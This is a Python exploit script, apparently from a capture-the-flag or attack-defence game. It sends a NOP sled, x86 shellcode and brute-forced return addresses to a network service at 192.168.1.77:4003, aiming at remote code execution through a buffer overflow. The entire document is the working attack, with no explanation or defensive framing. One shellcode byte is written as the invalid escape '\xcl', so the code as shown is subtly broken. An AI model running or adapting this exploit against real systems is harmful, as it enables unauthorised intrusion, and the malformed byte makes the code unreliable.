#!/usr/bin/python3
import sys
import socket
import struct

ip = '192.168.1.77'
port = 4003
hacker_info = b'03|03-WvZjVz_oQImWWHz__uSR0Q-03|'
shellcode=b'\x6a\x43\x59\xe8\xff\xff\xff\xff\xcl\x5e\x30\x4c\x0e\x07\xe2\xfa\x30\xd9\xf4\xe7\x56\x45\x54\x62\x0b\x83\xea\xbc\x6b\xc3\x8f\x83\x48\xa2\x2c\xd9\x95\x5F\x6e\xe1\x71\xda\xb3\x1d\x2a\x76\x1d\x20\x17\x92\xaa\xc5\x95\x40\x77\x79\x7a\x99\x28\xa5\xcc\xe3\xaf\x62\x59\x5c\x1c\x47\x5d\x5e\x18\x17\x5b\x53\xb2\xdf\x6f\x6d\xb6\xa1\xf1\x49\x8e\xc4'
nop_sled = b'\x90' * 321

def do():
	start = 0xfffdd001
	end = 0xffffe001
	while (start < end):
		i = 0
		while (i < 4):
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, port))

			ret = struct.pack('<I', start)

			s.send(hacker_info + nop_sled + b'\x90' * i + shellcode + ret *24)
			s.close()
			i += 1
		start += 200
	s.close()

if __name__ == "__main__":
	do() 
